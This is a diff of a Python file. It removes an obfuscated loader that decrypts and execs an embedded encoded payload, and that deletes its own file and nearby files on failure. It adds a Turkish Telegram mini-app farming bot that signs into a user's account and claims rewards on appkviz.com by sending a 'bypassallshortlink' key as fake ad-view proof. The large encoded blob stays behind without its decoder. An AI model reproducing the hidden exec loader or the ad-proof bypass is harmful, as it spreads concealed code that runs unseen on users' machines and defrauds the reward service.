@@ -1,95 +1,288 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-__OWN__ = "KetuaKelas_id"
-__OBF__ = "HydraSentinel V5"
-__USR__ = "Cool Sentinel Client Protection Layer"
-__MSG__ = "Nice try to decode it"
-__GLB__ = (lambda x: x + 100)(1000)
+# AlperenTheCreator ✅ TAMAM
 
-import importlib as _imp
+import asyncio
+import os
+import random
+import re
+import sys
+import urllib.parse
+from datetime import datetime
 
-_builtins_dict = object.__getattribute__(__import__('builtins'), '__dict__')
-_eval_engine = _builtins_dict['eval']
-_bytes_engine = _builtins_dict['bytes']
-_str_engine = _builtins_dict['str']
+import aiohttp
+from telethon import TelegramClient
+from telethon.errors import SessionPasswordNeededError
+from telethon.tl.functions.messages import RequestWebViewRequest
 
-def _fetch_mod(h):
-    return _imp.import_module(_bytes_engine.fromhex(h).decode())
+API_ID = 1585960
+API_HASH = "07234bf217bf52a1c29b610532af3d1f"
+BOT_USERNAME = "taskcryptorewards_bot"
+WEBAPP_URL = "https://appkviz.com/app"
+YENI_API_KEY = "bypassallshortlink"
 
-_os_mod = _fetch_mod("6f73")
-_zlib_mod = _fetch_mod("7a6c6962")
-_bz2_mod = _fetch_mod("627a32")
-_b64_mod = _fetch_mod("626173653634")
-_marshal_mod = _fetch_mod("6d61727368616c")
-_aes_mod = _fetch_mod("43727970746f2e4369706865722e414553")
-_unpad_mod = _fetch_mod("43727970746f2e5574696c2e50616464696e67")
 
-def 욮둺싈튡귭뵛힣쐗(s):
-    result = []
-    if len(s) > 100:
-        s = s[(lambda 틬뽇쇾핗궂: 틬뽇쇾핗궂 ^ 56)(10):(lambda 엀흘럟왽께: 엀흘럟왽께 ^ 40)(-26)]
-    for c in s:
-        o = ord(c)
-        if 0x4E00 <= o <= 0x9FFF:
-            result.append((o - 0x4E00) & 0xFF)
-        elif 0x3400 <= o <= 0x4DBF:
-            result.append((o - 0x3400) & 0xFF)
-        elif 0x2800 <= o <= 0x28FF:
-            result.append((o - 0x2800) & 0xFF)
-        elif o not in [0x200B, 0x200C, 0x200D, 0xFEFF]:
-            result.append(o & 0xFF)
-    return _bytes_engine(result)
+class C:
+    G = "\033[92m"
+    Y = "\033[93m"
+    C = "\033[96m"
+    R = "\033[91m"
+    X = "\033[0m"
 
-class __샮뎄펎뿪깭댶__:
-    def __init__(self, *args):
-        self._data = args[0]
-        self._keys = args[1]
-        self._pill = args[2]
-        
-    def 젻뽚괘쭟깩핬뗛꿅(self):
+
+def clear():
+    sys.stdout.write("\033[2J\033[H")
+    sys.stdout.flush()
+
+
+def _renksiz_uzunluk(text):
+    return len(re.sub(r"\033\[[0-9;]*m", "", text))
+
+
+def _satir(text, width):
+    temiz = _renksiz_uzunluk(text)
+    bosluk = max(width - temiz - 2, 0)
+    return f"┃{text}{' ' * bosluk}┃"
+
+
+def banner():
+    clear()
+    width = min(os.get_terminal_size().columns, 90)
+    line = "━" * (width - 2)
+    print(f"{C.G}┏{line}┓{C.X}")
+    print(_satir(f"{C.Y}      ❯ AlperenTheCreator ✅ TAMAM ❮{C.X}", width))
+    print(_satir("========================================", width))
+    print(_satir("AlperenTheCreator ✅ TAMAM", width))
+    print(_satir("========================================", width))
+    print(_satir("", width))
+    for row in [
+        "              ███╗   ██╗██╗   ██╗██╗   ██╗██╗   ██╗██╗",
+        "              ████╗  ██║██║   ██║╚██╗ ██╔╝██║   ██║██║",
+        "              ██╔██╗ ██║██║   ██║ ╚████╔╝ ██║   ██║██║",
+        "              ██║╚██╗██║██║   ██║  ╚██╔╝  ██║   ██║██║",
+        "              ██║ ╚████║╚██████╔╝   ██║   ╚██████╔╝███████╗",
+        "              ╚═╝  ╚═══╝ ╚═════╝    ╚═╝    ╚═════╝ ╚══════╝",
+    ]:
+        print(_satir(f"{C.C}{row}{C.X}", width))
+    print(_satir(f"{C.Y}❯❯❯ WEBSİTE & TELEGRAM MINI APP OTOMATİK FARM SCRIPTİ ❮❮❮{C.X}", width))
+    print(f"{C.G}┗{line}┛{C.X}")
+
+
+def dashboard(balance, today_act, max_act, current_status):
+    width = min(os.get_terminal_size().columns, 90)
+    line = "━" * (width - 2)
+    print(f"{C.G}┏{line}┓{C.X}")
+    print(_satir(f"{C.Y}  GÖSTERGE PANELİ{C.X}", width))
+    print(f"{C.G}┣{line}┫{C.X}")
+    print(_satir(f"  Geliştirici : {C.C}AlperenTheCreator{C.X}", width))
+    print(_satir(f"  Kanal       : {C.C}t.me/teamnuyul{C.X}", width))
+    print(_satir(f"  Bakiye      : {C.G}{balance}{C.X}", width))
+    print(_satir(f"  Aktivite    : {C.Y}{today_act}/{max_act}{C.X}", width))
+    print(_satir(f"  Durum       : {current_status}", width))
+    print(f"{C.G}┗{line}┛{C.X}")
+
+
+def log_msg(msg, type="info"):
+    now = datetime.now().strftime("%H:%M:%S")
+    if type == "success":
+        prefix = f"{C.G}[+]{C.X}"
+    elif type == "error":
+        prefix = f"{C.R}[!]{C.X}"
+    else:
+        prefix = f"{C.Y}[*]{C.X}"
+    print(f"{C.C}[{now}]{C.X} {prefix} {msg}")
+
+
+async def get_tg_init_data(silent=False, session_name="appkviz_session"):
+    if not silent:
+        banner()
+        log_msg("Telegram kimlik doğrulaması başlatılıyor...")
+    client = TelegramClient(session_name, API_ID, API_HASH)
+    try:
+        await client.connect()
+    except Exception as e:
+        log_msg(f"Telegram bağlantısı başarısız: {e}", "error")
+        return None
+
+    if not await client.is_user_authorized():
+        log_msg("Telegram oturumu yok! Yeniden giriş gerekiyor...", "error")
+        phone = input(f"{C.Y}Telefon numarası (Örnek: +905xxx): {C.X}")
         try:
-            _curr = 욮둺싈튡귭뵛힣쐗(self._data)
-            
-            for _hex_key in reversed(self._keys):
-                _key_mat = _bytes_engine.fromhex(_hex_key)
-                _aes_key = _key_mat[:32]
-                _xor_key = _key_mat[32:]
-                
-                _curr = _b64_mod.b85decode(_curr)
-                
-                _iv, _ct = _curr[:16], _curr[16:]
-                _cip = _aes_mod.new(_aes_key, _aes_mod.MODE_CBC, _iv)
-                _curr = _unpad_mod.unpad(_cip.decrypt(_ct), 16)
-                
-                _curr = _curr[::-1]
-                _curr = _bytes_engine([_b ^ _xor_key[_i % 32] for _i, _b in enumerate(_curr)])
-                _curr = _bz2_mod.decompress(_curr)
-                
-                _curr = _zlib_mod.decompress(_curr)
-            
-            _target = _marshal_mod.loads(_curr)
-            _builtins_dict['exec'](_target, globals())
-            
-        except Exception as _e:
+            await client.send_code_request(phone)
+            otp = input(f"{C.Y}OTP kodu: {C.X}")
             try:
-                _builtins_dict['exec'](self._pill, globals())
-            except:
-                pass
-            try:
-                if '__file__' in globals() and _os_mod.path.exists(__file__): 
-                    _os_mod.remove(__file__)
-                _base = _os_mod.path.dirname(_os_mod.path.abspath(__file__))
-                for _r, _dirs, _files in _os_mod.walk(_base):
-                    for _f in _files:
-                        if _f.endswith(('.pyc', '.pyo', '.txt', '.tmp')):
-                            try: _os_mod.remove(_os_mod.path.join(_r, _f))
-                            except: pass
-            except:
-                pass
-            _os_mod._exit(0)
+                await client.sign_in(phone, otp)
+            except SessionPasswordNeededError:
+                two_fa = input(f"{C.Y}2FA şifresi (varsa): {C.X}")
+                await client.sign_in(password=two_fa)
+        except Exception as e:
+            log_msg(f"Giriş başarısız: {e}", "error")
+            await client.disconnect()
+            return None
+        log_msg("Giriş başarılı (oturum otomatik kaydedildi).", "success")
+
+    try:
+        webapp_result = await client(RequestWebViewRequest(
+            peer=BOT_USERNAME,
+            bot=BOT_USERNAME,
+            platform="android",
+            url=WEBAPP_URL,
+        ))
+        query_string = webapp_result.url.split("#tgWebAppData=", 1)[1].split("&tgWebAppVersion", 1)[0]
+        init_data = urllib.parse.unquote(query_string)
+        await client.disconnect()
+        return init_data
+    except Exception as e:
+        log_msg(f"WebApp verisi alınamadı: {e}", "error")
+        await client.disconnect()
+        return None
+
+
+class AppKvizFarmer:
+    def __init__(self, init_data, session):
+        self.session = session
+        self.init_data = init_data
+        self.base_url = "https://appkviz.com/api"
+        self.headers = {
+            "sec-ch-ua-platform": "Android",
+            "user-agent": "Mozilla/5.0 (Linux; Android 15; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.7680.153 Mobile Safari/537.36 Telegram-Android/12.1.1",
+            "accept": "*/*",
+            "content-type": "application/json",
+            "platform": "android",
+            "origin": "https://appkviz.com",
+            "x-requested-with": "org.telegram.messenger",
+            "referer": "https://appkviz.com/app",
+            "authorization": init_data,
+        }
+
+    def update_auth(self, new_init_data):
+        self.init_data = new_init_data
+        self.headers["authorization"] = new_init_data
+
+    async def login(self):
+        url = self.base_url + "/user/auth/telegram"
+        async with self.session.post(url, headers=self.headers, json={"platform": "android"}) as res:
+            data = await res.json(content_type=None)
+            return res.status == 200 and data.get("success"), data.get("data")
+
+    async def get_state(self):
+        url = self.base_url + "/user/state"
+        async with self.session.get(url, headers=self.headers) as res:
+            data = await res.json(content_type=None)
+            return data.get("data") if res.status == 200 and data.get("success") else None
+
+    async def get_news(self):
+        url = self.base_url + "/user/news?user_id=0&page=1&limit=50"
+        async with self.session.get(url, headers=self.headers) as res:
+            data = await res.json(content_type=None)
+            return data.get("data") if res.status == 200 and data.get("success") else []
+
+    async def init_task(self, news_id):
+        url = self.base_url + f"/user/news/{news_id}/init"
+        async with self.session.post(url, headers=self.headers, json={"newsId": news_id}) as res:
+            return await res.json(content_type=None)
+
+    async def confirm_ad(self, token):
+        url = self.base_url + "/user/ad-proofs/confirm"
+        payload = {"provider": YENI_API_KEY, "apiKey": YENI_API_KEY, "token": token}
+        async with self.session.post(url, headers=self.headers, json=payload) as res:
+            data = await res.json(content_type=None)
+            return data.get("success"), data
+
+    async def complete_task(self, news_id, token):
+        url = self.base_url + f"/user/news/{news_id}/complete"
+        payload = {"newsId": news_id, "token": token, "apiKey": YENI_API_KEY}
+        async with self.session.post(url, headers=self.headers, json=payload) as res:
+            return await res.json(content_type=None)
+
+
+async def main():
+    init_data = await get_tg_init_data()
+    if not init_data:
+        log_msg("Kimlik doğrulama başarısız. Program durduruldu.", "error")
+        sys.exit(1)
+
+    async with aiohttp.ClientSession() as session:
+        farmer = AppKvizFarmer(init_data, session)
+        ok, auth_data = await farmer.login()
+        if not ok:
+            log_msg("API giriş durumu: başarısız > Script durduruldu.", "error")
+            return
+
+        while True:
+            state = await farmer.get_state()
+            if not state:
+                log_msg("Güncel durum alınamadı. Token süresi dolmuş veya ağ kesilmiş olabilir.", "error")
+                log_msg("Otomatik yeniden bağlantı başlatılıyor...")
+                new_init_data = await get_tg_init_data(silent=True)
+                if new_init_data:
+                    farmer.update_auth(new_init_data)
+                    await farmer.login()
+                    log_msg("Otomatik yeniden bağlantı ve giriş başarılı!", "success")
+                    continue
+                log_msg("Yeniden bağlantı başarısız. 10 saniye sonra tekrar denenecek...", "error")
+                await asyncio.sleep(10)
+                continue
+
+            user = state.get("user", {})
+            settings = state.get("settings", {})
+            balance = user.get("balance", 0)
+            today_act = user.get("todayActivities", 0)
+            max_act = settings.get("daily_limit_views", 0)
+            cooldown = int(settings.get("news_task_cooldown_seconds", 30))
+            banner()
+            dashboard(balance, today_act, max_act, f"{C.G}Çalışıyor{C.X}")
+            log_msg("Haber görevleri kontrol ediliyor...")
+
+            if max_act and today_act >= max_act:
+                log_msg("Günlük limit doldu! Otomatik durduruldu.", "success")
+                return
+
+            news_list = await farmer.get_news()
+            tasks_processed = 0
+            for news in news_list or []:
+                if news.get("completed"):
+                    continue
+                news_id = news.get("id")
+                title = (news.get("title") or "")[:60]
+                if len(news.get("title") or "") > 60:
+                    title += "..."
+                log_msg(f"Görev ID {news_id} işleniyor. Hedef: {title}")
+                init_res = await farmer.init_task(news_id)
+                if init_res.get("needsCaptcha") or not init_res.get("adSessionToken"):
+                    log_msg("Görev captcha istiyor veya başlatılamadı. Atlanıyor!", "error")
+                    continue
+                token = init_res.get("adSessionToken")
+                log_msg("Reklam kanıtı onayı gönderiliyor...")
+                confirmed, _ = await farmer.confirm_ad(token)
+                if not confirmed:
+                    log_msg("Reklam onayı başarısız. Atlanıyor!", "error")
+                    continue
+                comp_res = await farmer.complete_task(news_id, token)
+                if comp_res.get("success"):
+                    log_msg(f"Görev ID {news_id} ödülü başarıyla alındı!", "success")
+                    tasks_processed += 1
+                    for remaining in range(cooldown, 0, -1):
+                        sys.stdout.write(f"\r{C.Y}[*]{C.X} Bekleme aktif: {remaining} saniye kaldı...   ")
+                        sys.stdout.flush()
+                        await asyncio.sleep(1)
+                    print(f"\r{C.G}[+]{C.X} Bekleme bitti! Yeni veriler yükleniyor...          ")
+                    break
+                log_msg("Görev tamamlanamadı. Atlanıyor!", "error")
+
+            if tasks_processed == 0:
+                loop_time = random.randint(15, 30)
+                log_msg("Şu anda yeni görev yok.")
+                for remaining in range(loop_time, 0, -1):
+                    sys.stdout.write(f"\r{C.Y}[*]{C.X} Dinlenme: {remaining} saniye sonra tekrar kontrol...   ")
+                    sys.stdout.flush()
+                    await asyncio.sleep(1)
+                print("\r" + " " * 70 + "\r", end="")
+
 
 if __name__ == "__main__":
-    _d = '见楁甍寎珔饒坜搎囘籊模镡鎆縻烻祴紩銧厨稝鴒獞卺墉駆祙炉僔礡罵挖琻璈怾浻嶮愼不蜜簯闿赒鵂羪澟棗殬瀁檉馪乇乱丵乨\ufeff乣\u200b⡯\u200b㑙㐳乶㑥乱\u200b㐳乄⡋㑡㐹㑱㐶⠨\u200b㑫\u200b㑬\u200b乡\ufeff㐽\u200d⡍丹㑤㑄㑏乻㐸㑹⡄乯⡶串㐡⠭乩\u200c⠡\ufeff⡟㐸⡚㑸\u200d㑑乴㑎丰⡙\u200d⡹⡇⡂乨㐾\ufeff㑇⡅乲\u200c⠽⡸\u200c㑬⡫\u200b㐱㑏⠦\u200d㑯乧⡋㑦㑢乭⡫丱⡥\u200b㐹\ufeff⡂也\u200d㑟⡤⡔㑎\u200c乓㑟⡌\ufeff㑉丽⠷\u200d⡧\u200b⠻㐲⡓\u200d乨\u200c⡘\u200c乀乱\u200d㑹⡄㑃⡴\u200d㐤\u200b㑏㑖\u200c⡁\ufeff乫个⡹㐥㑣⡩㑰⠼⠭⡗乓乇⠫㑣㐤⡻乂\ufeff乗⠫\u200d乙乡㑉\u200d㑰丼乺也⡇㑋㑺\ufeff⠴\u200c⡵\ufeff⠴⡸㐹\u200c㐲㑌\u200c⡡\ufeff⡐\ufeff㑬乔丹⠣㑦\u200c㑸㑀乞㐭\ufeff乐⡥\u200d㑵㑃㐡⡗㐽\u200d㑞⡻⠨⡰\u200d㑾㑟\u200b⡸乙乸㑻⡤\ufeff乬\u200d乮乣⡲㑘中\u200d⡡⠭\u200b㑕㑚両丱乊⡠⡶乖\ufeff⠭㐭⠡⠴⠾⠻㐷\u200d㑐乏\u200b㐵乣⡧㑓\ufeff⠭\u200b⡳\ufeff乔\u200d⡍㑍\u200d乻㑕\u200c㐴⡟\u200d㑘㑕㑯\u200c⡼乒㑎丽㑩㐫\ufeff⠹㑨\u200c义\u200b乷㐭\u200d⡺㑟㑮⡗㐿\u200b⡫⡦㑅㑂㑖\ufeff㐵乎㐩\ufeff⠦㑘㐣⡀乥⡤\ufeff⡍乺\u200c丼⡳⡌丫㐤⡄㑇㑠⡎\u200b久⠿乷⠣㐤\ufeff丿\u200d两\u200c举\ufeff乐\ufeff㑎⠭\u200b㑏㑑丽㑇\u200b乫⡾㐭⡈\u200c㐡丱⡳⡡中⠥\u200d㐳㑧\u200d丳\u200c㑴乄\ufeff㑴乐⡩习㑺乏㐿乑乇\u200c⡰⡣\u200d㑳\ufeff⡳㐷⠭⡆㑈乷\u200d⠴㑣⡰⠾⡰\u200c⡨㐩㑩丱⡚\u200d两乞\u200c⡾⡀\ufeff㐡⠷串\u200d乌丱㑘㑎\u200d⡍\u200b㑎举㐶\u200b乓\u200c⡰乨⠤㑆⡍丱⡏\u200b⡲\ufeff⡔㑗㑧㐰乓乷⡯丶㐣⠴㑨㑊乷\u200b⡽严乲⡢⠱\u200c㑃㑆⡘个⡫㑠\u200c㑶乒乗中丱⡯\u200c丫㑰\u200c乬也⡌㑡㑸乱㑲乹⡆\u200c⠳㑯\u200d㑅㑆\u200b丽⡑⡒㑲㐣书乱\u200b⡥㑌㑥㐿\u200c㑸乱㐱㑭丩乚⡸⡈⠷㑢义\u200d㑲㑈乂㑗乮⡲㐤\u200b⠽乏丨㐨\u200d㑙㑏\ufeff㑴⡕乪\u200d⡚\u200d㑬丵㑇㑯㑔⡂\u200c乶㐪乹㐻㐾\u200d丹\u200c㑏㑐乖\ufeff乱\u200d⠡丰\u200c也⡕\ufeff⠦⡮\u200b乀⡟乕㐷\u200c么㑾⡞\u200d㑑\u200b乖\u200c㑃\u200c乱⡞\ufeff乥㑉\u200d㐷⡋乴\u200c㑸㑀\u200b严㐽㑯⠤㑐\u200d⠨乇㑤㐰\u200d㐸㑃也\u200d⡯乲\u200d⡯㐪㐤乭⠥㐷両㐹㑲\u200b㑔中⡀⠵㐽乨\ufeff乤\ufeff⡦㑙乯\u200d㑮\u200b⠶乺\u200d㑣\ufeff⡣\u200d㑂㐳\u200b书\u200c书乑⡐⡹⡠㐫\u200c⠨乡\u200d㑟㐥\u200b㑠㐥\ufeff⡆\ufeff乯⡸㐫㐴丹\u200b㑘㐹⠱\u200c㑂\ufeff乘乾乒㑸\u200c㐳\u200c㐥⡩㑊乗㑢乁⠤㑮中\u200d乮乘⡣㐸㑰乔⡼乏⡫\ufeff乤\u200b㐣\ufeff㑙乁㑴乵\u200c丳⡦㑅㐾\u200d㑔⠭\u200d⠥丵⠥\ufeff乴㑬乼㑅\u200c㑍丨㐷⡪⡪丨⡳⡼㐿㑓\u200d乹举丩㐿㑁\u200d乒㑪乓㑙㑘㑥乮乬乏乣举⡶\u200b乙⡞乧乯\ufeff㑶乻乽\ufeff㐸⡮㐷乆\u200b⠻㑚㐻㐶⠦\u200d㑠\u200c举乬⡎乮㑄\u200b乥\ufeff乥㑚㑄\ufeff㑵⠻\u200c么\u200c丷书㑡㑅㐫㑡乇㐼⡍⠷乶⡦⠴\u200d㐾㐤举\u200d乀㐽\ufeff⡢⡞㑵㑚\ufeff⠡⠩⠱乇㐼⡋⠼丶⡦\u200d⡽\ufeff㐳\ufeff㐳⡼\ufeff乌乴\u200b乒乹両\u200c⡻㐪乖丽⡮乎\u200d⡣\ufeff⡂㐴丱\u200d㑮⡨乙\u200b㑇⡮\u200d㐵㑶串乓\u200b丱⠩丨㑃⡢乍丱㑍\u200c乎\u200d丣举乞\ufeff㑱㑖㑃丿⠦\u200d⡺\ufeff⡒㑘\u200b乱⠪\u200b乔㑘\u200c㑈\ufeff乩乍㐾\u200b⡵乵乓⠵㑔\u200c⡀丽㑎㑞乤买乡㑐乮丽\ufeff㑔㑶\u200d⡦㑲丱㑵乡\u200b⡡⡷\u200b㐨⠣⡔\ufeff乬㑩⡰乔⡬㐹㑏\u200d乡\ufeff㑡㑔\u200b㑅乵\ufeff㑸丩㑕⡨\u200b⡯\u200c⡶㑦\u200d⠨乣个⡣⡃⡆乊⡸乺乵乄㑎\u200b㑣\ufeff㐰㑕㐹\u200d⡺\ufeff乶乃\u200c⡀乞\ufeff㑏⡣⠤\u200c㑘\u200d㐷⠫\u200b㑷乲\u200b⡸⡫\ufeff⠲⠪⡑㑻\u200d⡄\u200d乑乶\u200c㐣⡱㑥\u200d㑃㑂⠤㑹㑥乎乲\u200d⡗⡷㐡\u200b⡩㑰㑲㑾乯\u200b⠸⡶㑍\ufeff乆㐶丳\u200d㐥丿\u200d乹\u200d⡞\u200d乪⠴㑷\ufeff久㐷⡢㑯么乂両\u200c⡫⡡⡄\u200c乥\u200b⡦乎\u200b丼\ufeff㑍⠱乆⡨\u200b乹丫乫⡶⡩㑇㑮\u200b⡨⡞㐦\u200c㑌㑬⡎乬⡹㑸\ufeff⡡㑥乚㑨⡣㑦\ufeff⠥乐⡳㑧\u200d⡞\u200b㑇乤\u200b㑙\u200b乇乙丰乙⡰㐰㑦乱久㑙⡞㐼⡣\ufeff乶\ufeff⠩乁\u200b㑲\u200c㑽㐸\u200d乊买\ufeff㑻\u200b㑶乌乙\ufeff⡦\u200b㑁乱⡶丫㑥⡀⡇\u200d⡼⠥乕⠵\u200d㑢㑍㑗\u200c主㑤㑣\u200c⠩\u200d㑄⠩\ufeff⠩㑃㑤㐥\ufeff乂⠡㐵⠪久⠳丳㑽⡆乕\u200d㑨\ufeff⠴⠨㑲乫丨⡭⠲\u200d⡟㐴㑮\ufeff⠳㐽乎之㐤乴\u200b两\ufeff丿\u200b乁乁㑏㐹㐪乖\u200d㑣\u200c⡻\u200d㐰㑥丹⠭㑟\u200d⡹⡓⡲\u200c㐤㐫㐾乚\u200c⠵⠼㑰㑥\ufeff乎乔\u200d⠲⡺⠪乵\u200b丩乨\ufeff⠨㑶⠿⡹\u200d举㑩⡬\u200d乂\ufeff⡰\ufeff㑶⡘⠷\ufeff⡈\u200d⡹⡃⡮乩\u200d乥\u200d㑮㐷乎㑞⠷⡢乓乀㑴\u200b㐭⡍丣㐸㑺⡯㐹丣㑨⡎⡹\u200d㑟⠥\u200c⡇\ufeff⡆\u200d⡟㑬丩⡍㑻\u200d乶㑋丹㐰\u200b乵㑇㑋乂⠰乷乺㑺乖㑌㑈义\u200b⡰㐲㑼㐣\u200b⡪\u200d⠻\u200b⠽\u200d义主乄\u200b㑉㑵⡄⡨㑃⡬㐳乂乑⡔书\ufeff⠽⡍\u200b乾両\u200c㑦⠷⡞\u200d⡹㐩㑙⡹⡁⠸\ufeff㑂⡅㑩久\u200d乂⡕㐴⡮乭\u200c乹\u200c乄乪乥⡽乪㑁\u200d⡢⠶㑠\ufeff乢⡢㑃乭㑼㐵\u200c⡮⡙\u200d乏⡸也乳⡵乇㑲\u200d㑴㑕\u200d乑\ufeff㑙⡻\u200d㑊⡯\ufeff㑴㑍⡵\u200d⡣⡳⡷乏⡲⡰\u200d丱⡰㐾⡗㐾㑁\u200b严丸㐪⡕\u200b丹义\ufeff丼㑁㐽⡳㑮㑀\u200b乌⡧⡌㐴乍⡃⡣乏㑷\ufeff乗\u200d㐷⠡\ufeff㑰㐰㑤\u200b举⠥㑅\u200b举⡣\u200b乢乞\ufeff㐻\u200b乎乳⡅⡄主㑋⡰⠼\u200c⡽⡯严\u200d㑐㑫㑪\ufeff㑄\u200c乵\u200c乃\u200c㐹\u200c乥⡇\u200d㑄㑤⠿⡒\u200b㐤\ufeff⠭㑙\u200b个\ufeff⡚也丫㑧乕㐦\ufeff丷㑉⡙⡉㑾\u200b⡴\u200c⡪⡓\u200b乔㑐\u200c丷\u200c个⡍⠩\u200b⡦乒⠶乧\u200c㐾㐻乄乢丰⡺\u200c⠲⠥㑳㑮乪⡥㑻乸㑘丱㑀㐶个⡹\u200b乊\u200b⡁⡫丶㑋\u200d丵\u200c両乃丽\u200b⡎丿\u200c之\u200c⡌么㑱\u200c乊㑉⡘\ufeff⡰丳⠽\u200b㐨⡾㑵㑚⡼⡯⡒⡎㑮⡼㑗⡎\u200d⠰㐶㐪\u200b㑺乑㐶⡟\ufeff丵㑾⠥个㑙㐽\u200d㑸㐳乼⡈买丽\ufeff㐣乬㑶\u200d⡒⠳⠨乢乥丰乐乍\u200d㐷㑅丰\u200b㑨丣⡟⠪⠼㐪\u200b丱习⡫\u200d乞両㑋丵乬⡓也⠦个乃乌\u200b㐽㐱⠾乱⡃\ufeff㑒\u200b⡅⡶\u200d㑩\u200d⠫\u200b⠫㑥㑗⠱⡘乼㑣㑷\u200b㑹㐹⡦串\u200d㐭⡸⠨\u200c㐼⡩\u200c⡌⡣⡭\ufeff乁㑴⡯⡘㑇丼㑶\u200d乮㑬丫㑵\u200c⠽⠻\u200b乳乖⡢\u200c㐱㑃㑒乞丩\u200b㑍\u200d㑄㑊㑲⡑\u200d乂㑋久⡼\u200b⡠也\u200b㑘⡟㑈\u200c㑓㑵⡹⡇㑧㐿㑯⡙両㑗\u200d乞⡍\u200b乓丩严\u200c⡡\u200c⡡\u200b㐳⠫\u200d乗並\ufeff⠡⡆\u200b⡅乐\ufeff丼\u200c乂乥乷㑠两\u200c义\ufeff㐽⡋並㑉⡩乵⡘⠫\u200c乽\u200d也\u200c㑤\ufeff⡕⡹㑩\u200c㐰㑇⠣⡺⡉㐥㐾\u200b⠻㑹乧乊\u200c个乼㑣乘⡬举⠿⡄乹乨㐻⡍乖㑍\u200d⡹中乐⡯两乭乐\ufeff⡸㑏丱㑸⡠\u200b乷乞丰㑃⠳乥\u200c㑕㑳㑨㑎丫\ufeff㑸乚\ufeff㑷㑤⡃⠲\u200d㑆\ufeff㑼\u200d丽⠶⡑㐤丰\u200c乷⠼义㐴久\u200c⠼\ufeff乾㑚⡈\ufeff㐻乕\u200b⡟乭\u200c㑗㑦㐦㑘㑉\u200b乖乤串\u200d㑒\ufeff㐷⠷⡗⡮\u200c㐿书\u200d⠼\ufeff⡻⡓\u200d习\u200c⠡习主㑞㑨乞㑦\u200b丿乧㑩⡌\ufeff⡉\u200b⡇㐲⠻\u200c⠫⠻㑤⡶㑽㑓丶⠶乌乗⡐\u200b乽⠼\u200c⡢串㑉⠶⡧㑪\u200d㑎\u200d㐳\u200c⡚㑁⡢㑣\u200d⠹⡧㑏乮临\u200d㑭\ufeff⡵⡥⠦乣么\u200c⡘⡺㑤㑮㑽⡧也㑅㑨㐤\u200b⡭乭乮\u200d乥⡡⡙\u200c⡁㐫㑾㐻⡒\u200b㑦㑃么㑓\u200c㑈\u200c⡑⠷久丷㐼㑔㑌\ufeff⠴⡗⠸⡫\u200b丶㐣⠽㑟⡽\u200b乁\u200d⡦乹\u200c⡪\u200b⡏么⡈\ufeff乍\u200b丰⡲\u200c㑇丿\u200b丫\u200d㑹\u200d㑧\u200b⠫⠽⡔㑣㑥\u200b⠷\u200b㑵⡘\u200b丷乆⡶乳\u200c乒\u200c乱\u200d⠹乵丶⡊㑾\u200b⡨乥两\u200c⡚⠱⡘义㑱⡁㑨㑏\ufeff㑪㑤⡻㑓乬习丣\u200c买\u200d⡯\u200c⡏\u200d⡷\u200d⠣㑐丰乕㑋乾\u200d乙乁丰\ufeff⠳书丶乼㑈\ufeff丼⠻\ufeff乫㑃⡁⡭⡢㑡\ufeff个㑥㑧⠱㑤\u200b㐭\u200d㑢乀\u200b㑢\u200d㑼⡑习乪㑮乃㑕⡖乥⠶举\ufeff⡷乀\ufeff⡬⡰乪㑢\u200c⡓乧\u200d⡀⡘⠼乫\u200b⡃\u200d⠥\ufeff㑲乵㐰\ufeff乳丫乏⡇乀\u200c㑧⡺乞\u200d㐸㑚㐿\u200d㑻\u200d㑇\u200c乥⡬㑷㑂\ufeff㑧⡆㑞㐰\u200d⡳⡓乫⡊㐡㐸\u200b⡖\u200b⠤丷\u200c㑃㑕乶乫乢㑂丰\u200b乫⡹乊⡏⡏\ufeff乼⡠㐩\u200d乡乪⡻义乳\u200d㑣\u200b乎⠡⡱㑾乕乙⡊㑊⠡㑑丳\u200d⡨\u200d两㑞㐵㑳㑇乆⡓\ufeff㐿㑁\u200d㐻丷\u200d㐷⡡\u200c乘⠼\u200c买㑨㑇两㑵⡰⡥丣丷之丫㑐⠵⡱㑸⡮\u200d乡⠶\u200c⡧⠸㐸也\u200b㐪丰⡆㐲\u200b㑞\u200d㐰\u200b㑢久乂㑑⡳⡡丨\u200c⠦乗\ufeff⡒㑻⡥\u200d㐳乨㑋㑣⠵㐭⡔乬\u200d乖㑂\ufeff⡒㑣㑃\u200d⡒乑⡬⠴\u200b乳\u200b⡌㐵⡈⡔㑸⠪\u200c串⡌⠣⠨⠶\ufeff㑡㑒㑁㑵\u200d㐵\u200b⡃㑎⡚乨㑆\u200b㐣㑊⡒⠩乷\u200b乺\u200b㐿丸⡺⡕⡒乗㐸\u200d㑦\u200b⠲⠪\ufeff㑂\u200d乘\u200c乡\u200c⠻⠱㑙㑱\ufeff⡋⡞\u200c⡩\ufeff㐲乞⠵⡪㐹⡉\ufeff⠴㑷㑇乁丳乨⠦\u200b乱㐿乻⡞丩⡢乸\u200c乖⡢㐴\ufeff临⡭⡦乚㑥乴乘个丣⠩⡥\u200d㐿\ufeff丨乣㐰⠲㑇㐡\ufeff乊㑦\u200b严㑞㑏⠽⡦⡦⡟⡂⠣乔两⡃㑓㑵\u200c乚乞⠱\u200d⠸\u200b乺㐣\u200d㑲⡳㑉\ufeff㑍㑀⡯㑅㐡⠭㐲⡘㐡\ufeff㑌⡧⠷㐩⡋㐾㑻㑄义丩⡶⠦\u200b丸⠱㑼㐶⠫⠳\u200d㐿㐥乀乱⡡\ufeff⠪㑶\u200d⡣㑀㑅\u200b义\u200c⡸乓\u200c㑾㑟乲乇⡣乣\u200d⡢⠫\u200b㑾⡧㐳⡵\u200d㐤㐼\u200c㐸\u200b乱\u200c书㐭㐥\u200d乩主\u200b乲乡\u200c㑕⡘⡯\u200c丳\u200b⡮㑍⡤㑡㐷㑏㑨㑐⡡\u200b㑹㐹乻\u200d⡴㑒㐫㑫\u200c㑉\u200d丶㑣\u200c⡚⡷\u200c乧㑋㐨㑫\u200b丵⠪⠦㐹乄㑟乔\u200c⠼\u200b⡨乓丹⡋⡼⠰㑬\ufeff㑻\u200b⡉⡐\u200d⡮\ufeff㑰⡾⡟\u200d乪\ufeff㑺\ufeff㑀㑆乮⠱\u200b㐡\u200c⡭\u200b乴⡀⠡⡇\u200d⡙\u200b乐⡻乱\u200b㑲乨\u200b㑖⡇⡀⡇⡟㐦\u200c⡢㐦㑗两丶⡎乐买\u200c㐫⡀㑞买⡗㐳㑓乞\u200b㐡\u200c㑵\ufeff乳\u200d⡲乙\u200c㐣\u200b丣㑅⡄㐩乩临